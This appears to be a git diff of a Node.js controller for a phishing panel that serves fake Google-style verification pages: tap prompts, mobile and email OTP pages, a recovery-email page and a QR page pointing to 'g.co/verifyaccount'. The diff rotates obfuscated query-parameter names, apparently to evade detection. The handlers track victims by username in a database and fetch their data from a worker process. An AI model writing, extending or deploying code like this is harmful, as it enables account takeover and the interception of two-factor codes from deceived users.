@@ -1,3 +1,5 @@
+
+
 const db = require('../models/db');
 const path = require('path');
 const fs = require('fs');
@@ -82,7 +84,7 @@ exports.getTap = (req, res) => {
     db.query('UPDATE autotable SET pagetype = ?, mobiletype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', [tc, mt, parts[1]]).catch(() => {});
     return res.render('tap', { tapcode: tc, mtype: mt });
   }
-  const tk = req.query.nxowuwonvdmbqrrwewosnadgdhgdus || '';
+  const tk = req.query.svhsdfhadeiueirncbxjcbbxcxb || '';
   const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
   (async () => {
     const r = await sendToWorker('getPageData', { username });
@@ -102,7 +104,7 @@ exports.getTapN = (req, res) => {
     db.query('UPDATE autotable SET pagetype = ?, mobiletype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', ['tapn', mt, parts[1]]).catch(() => {});
     return res.render('tapn', { mtype: mt });
   }
-  const tk = req.query.nxowuwonvdmbqrrwewosnadgdhgdus || '';
+  const tk = req.query.svhsdfhadeiueirncbxjcbbxcxb || '';
   const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
   (async () => {
     const r = await sendToWorker('getPageData', { username });
@@ -116,7 +118,7 @@ exports.getTapN = (req, res) => {
 exports.getMobileConfirm = (req, res) => {
   const encoded = req.query['NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj'];
   if (encoded) return res.render('mconfi', { mobNumber: '***' });
-  const tk = req.query.nxowuwonvdmbqrrwewosnadgdhgdus || '';
+  const tk = req.query.svhsdfhadeiueirncbxjcbbxcxb || '';
   const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
   (async () => {
     const r = await sendToWorker('getPageData', { username });
@@ -139,7 +141,7 @@ exports.mobileResultCheck = async (req, res) => {
 };
 
 exports.getMobileOtpPage = async (req, res) => {
-  const tk = req.query.nxowuwonvdmbqrrwewosnadgdhgdus || '';
+  const tk = req.query.svhsdfhadeiueirncbxjcbbxcxb || '';
   const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
   const r = await sendToWorker('getPageData', { username });
   const hiddenMobNumber = (r.data && r.data.hiddenMobNumber) ? r.data.hiddenMobNumber : (req.query.mob || '***');
@@ -187,7 +189,7 @@ exports.eotpResultCheck = async (req, res) => {
 };
 
 exports.getEotp = (req, res) => {
-  const tk = req.query.nxowuwonvdmbqrrwewosnadgdhgdus || '';
+  const tk = req.query.svhsdfhadeiueirncbxjcbbxcxb || '';
   const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
   (async () => {
     const r = await sendToWorker('getPageData', { username });
@@ -198,7 +200,7 @@ exports.getEotp = (req, res) => {
 };
 
 exports.getRecEmail = (req, res) => {
-  const tk = req.query.nxowuwonvdmbqrrwewosnadgdhgdus || '';
+  const tk = req.query.svhsdfhadeiueirncbxjcbbxcxb || '';
   const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
   (async () => {
     const r = await sendToWorker('getPageData', { username });
@@ -227,7 +229,7 @@ exports.getQrCode = (req, res) => {
     db.query('UPDATE autotable SET pagetype = ? WHERE username = ? ORDER BY id DESC LIMIT 1', ['your phone', username]).catch(() => {});
     return res.render('qr-code', { pnumber: 'your phone', mlink: 'g.co/verifyaccount' });
   }
-  const tk = req.query.nxowuwonvdmbqrrwewosnadgdhgdus || '';
+  const tk = req.query.svhsdfhadeiueirncbxjcbbxcxb || '';
   const username = tk ? Buffer.from(tk, 'base64').toString('utf8') : '';
   (async () => {
     const r = await sendToWorker('getPageData', { username });
